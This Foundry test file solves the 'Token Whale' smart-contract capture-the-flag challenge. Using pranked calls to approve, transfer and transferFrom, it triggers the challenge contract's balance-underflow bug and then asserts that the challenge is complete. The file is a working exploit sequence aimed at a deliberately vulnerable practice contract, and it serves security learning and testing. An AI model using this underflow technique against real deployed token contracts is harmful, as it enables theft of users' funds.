// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {TokenWhaleChallenge} from "src/Math/TokenWhale.sol";

contract TokenWhaleChallengeTest is Test {
    TokenWhaleChallenge public tokenWhaleChallenge;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        tokenWhaleChallenge = new TokenWhaleChallenge(alice);
    }

    function testTokenWhale() public {
        console.log("token totalSupply:", tokenWhaleChallenge.totalSupply());
        console.log("alice balance:", tokenWhaleChallenge.balanceOf(alice));
        console.log("bob balance:", tokenWhaleChallenge.balanceOf(bob));

        vm.startPrank(bob);
        tokenWhaleChallenge.approve(alice, 1);
        vm.stopPrank();

        vm.startPrank(alice);
        tokenWhaleChallenge.transfer(bob, 1000);
        tokenWhaleChallenge.transferFrom(bob, address(0), 1);
        vm.stopPrank();

        console.log("token totalSupply after:", tokenWhaleChallenge.totalSupply());
        console.log("alice balance after:", tokenWhaleChallenge.balanceOf(alice));
        console.log("bob balance after:", tokenWhaleChallenge.balanceOf(bob));

        assertTrue(tokenWhaleChallenge.isComplete());
    }
}